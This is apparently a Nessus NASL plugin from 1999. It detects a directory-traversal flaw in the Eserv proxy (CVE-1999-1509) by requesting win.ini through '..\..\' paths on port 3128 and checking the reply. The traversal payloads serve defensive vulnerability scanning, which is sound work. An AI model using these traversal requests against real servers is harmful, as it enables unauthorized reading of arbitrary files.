#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10063);
 script_bugtraq_id(773);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-1509");
 name["english"] = "Eserv traversal";
 name["francais"] = "Eserv traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending ../../
or ..\..\ in front on the file name.

Solution : Use another web proxy
Risk factor : High";

 desc["francais"] = "Il est possible de lire
n'importe quel fichier sur la machine distante
en ajoutant des points devant leur noms,
tels que ../../ ou ..\..\.


Solution : d�sactivez ce service et installez
un vrai proxy

Facteur de risque : Elev�";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "\..\..\file.txt";
 summary["francais"] = "\..\..\file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Acc�s aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports(3128);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = 3128;

if(get_port_state(port))
{
req1 = http_get(item:"..\\..\\..\\..\\..\\..\\windows\\win.ini", port:port);
req2 = http_get(item:"..\\..\\..\\..\\..\\..\\winnt\\win.ini", port:port);


soc = http_open_socket(port);
if(soc)
{
 send(socket:soc, data:req1);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if("[windows]" >< r){
 	security_hole(port);
	exit(0);
	}
 soc2 = http_open_socket(port);
 send(socket:soc2, data:req2);
 r = http_recv(socket:soc2);
 http_close_socket(soc2);
 if("[fonts]" >< r){
 	security_hole(port);
	exit(0);
	}
 }
}


